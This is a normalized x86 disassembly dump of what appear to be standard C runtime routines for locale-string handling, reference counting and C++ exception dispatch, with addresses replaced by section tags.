mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_426883
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_426883
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_431866
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_424869
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_424869
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_424869
pop ecx
push [ esi + 0x54 ]
call sub_424869
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_424869
pop ecx
sub_426bd6
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_42a735
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_4258f0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_4268c3
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_42aae1
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_431f4a
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_4269ec
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_4285a0
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_42aae1
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_4285a0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_4318da
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_426e07
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_42a735
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_426bd6
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_4258f0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_428905
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_4285a0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_42aae1
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_4285a0
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rw-data
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_424869
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_430a86
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_424869
push [ ebx + 0x54 ]
call sub_424869
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_43213b
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_427109
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_426a59
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_426e07
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_426bd6
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_426e07
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_424b04
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_4258f0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_424930
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_4318da
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_426e07
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_4337c0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_427324
push 0x14
push r--data
call sub_42b398
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_42a735
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_4266f5
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_42894a
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_425eb1
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42748f
mov eax [ ebp - 0x20 ]
push 0xc
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_426691
mov [ ebp - 0x4 ] ebx
call sub_427452
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_427109
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_42b3dd
retn
push edi
call sub_4265f8
push edi
call sub_426420
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_4266b7
push edi
call sub_4265f8
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_42745e
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov edi [ ebx ]
mov eax rw-data
call sub_4266b7
push 0x18
mov eax [ rw-data ]
add eax 0xc
push eax
push rw-data
call sub_4285a0
add esp 0xc
call sub_42676b
sub_427494
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_423801
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4274bd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4238ce
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4274e4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_427543
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_42a735
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_42a735
add eax 0x90
dec [ eax ]
call sub_42a735
and [ eax + 0x90 ] 0x0
jmp sub_42eecd
sub_42758c
push 0x10
push r--data
call sub_42b398
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427652
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_42a735
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_42b3dd
retn
call sub_42ef19
call sub_42ef19
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_430880
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_42766d
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_42a735
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_4276b2
push 0x8
push r--data
call sub_42b398
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_42b3dd
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_4259f9
mov [ ebp - 0x4 ] 0xfffffffe
sub_427707
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_427743
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_42ef19
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_4274e4
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_427807
push 0x2c
push r--data
call sub_42b398
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_425ca8
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_42a735
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_42a735
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_42a735
mov [ eax + 0x88 ] esi
call sub_42a735
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_425d4d
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_42792d
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
sub_4278a0
mov esp [ ebp - 0x18 ]
call sub_42a735
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_42758c
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_42792d
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_42792d
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_425cfb
pop ecx
call sub_42a735
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_42a735
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_425cd4
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_4276b2
pop ecx
pop ecx
sub_4279a3
push 0xc
push r--data
call sub_42b398
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42ef19
push ebx
push esi
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_433800
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_4250d0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_433800
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_427707
pop ecx
pop ecx
push eax
push esi
call sub_4250d0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_42b3dd
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_427707
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_427b22
push 0x8
push r--data
call sub_42b398
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_427707
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4259f9
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_4279a3
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b3dd
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_427707
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4259f9
jmp r-xdata
sub_427bb4
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_427b22
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_4259c7
call sub_425a00
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_42758c
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_427807
add esp 0x28
test eax eax
je r-xdata
sub_427c22
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_42a735
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_42a735
lea edi [ eax + 0x80 ]
call sub_42a4a3
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_425c33
mov edi eax
